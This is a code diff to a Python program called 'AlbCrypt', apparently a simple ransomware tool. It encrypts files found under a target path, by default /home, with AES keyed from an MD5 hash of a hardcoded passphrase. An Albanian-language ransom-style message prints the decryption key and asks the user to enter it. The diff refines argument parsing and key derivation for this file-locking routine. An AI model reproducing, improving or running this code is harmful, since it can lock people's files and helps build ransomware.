@@ -1,6 +1,7 @@
 import pyaes
 import os
 import argparse
+import hashlib
 
 import recon
 import recon_dec
@@ -8,7 +9,7 @@ import ascii_artwork
 
 
 #hardcoded key to decrypt files
-hardcoded_key = "albanian submarine"
+hardcoded_passphrase = "albanian submarine"
 
 
 #function to encrypt found files
@@ -40,11 +41,16 @@ def decrypt_files(file_name, key):
 def get_parser():
 
     parser = argparse.ArgumentParser(description='AlbCrypt')
-    parser.add_argument('decrypt', help='decrypt files [default: no]',
+    parser.add_argument('-d', '--decrypt', help='decrypt files [default: no]',
                         action="store_true")
-    parser.add_argument('-p', '--startpath', help='specify target path [default: /home]',
-                        action='store_true')
+    parser.add_argument('-p', '--startpath', type=lambda x: is_valid_directory(parser, x), help='specify target path [default: /home]')
     return parser
+
+def is_valid_directory(parser, arg):
+    if not os.path.isdir(arg):
+        parser.error(f'The directory {arg} does not exist')
+    else:
+        return arg
 
 
 def main():
@@ -53,6 +59,9 @@ def main():
     args    = vars(parser.parse_args())
     decrypt = args['decrypt']
     startpath = args['startpath']
+
+    key = hashlib.md5(hardcoded_passphrase.encode('utf-8')).hexdigest()
+    key = key.encode('utf-8')
 
     if decrypt:
         print (f'''
@@ -68,21 +77,22 @@ gjendet me poshte. Sigurohuni qe ta shkruani sakte celesin, ndryshe rrezikoni te
 humbisni filet tuaja pergjithmone. Mos perfshini thonjezat ne celesin e dekriptimit.
 Dekriptim te mbare!
 
-Celesi i dekriptimit eshte: {hardcoded_key}
+Celesi i dekriptimit eshte: {hardcoded_passphrase}
 ''')
-        key = input('VENDOS CELESIN KETU: ')
+        passphrase = input('VENDOS CELESIN KETU: ')
 
-        if key == hardcoded_key:
+        if passphrase == hardcoded_passphrase:
             decrypt_files(recon_dec.get_files(startpath), key)
         else:
             print("Your decryption key is incorrect!")
         exit()
 
     else:
-        if hardcoded_key:
-            key = hardcoded_key
+        if hardcoded_passphrase:
+            passphrase = hardcoded_passphrase
     
     if startpath:
+
         encrypt_files(recon.get_files(startpath), key)
     else:
         encrypt_files(recon.get_files('/home'), key)
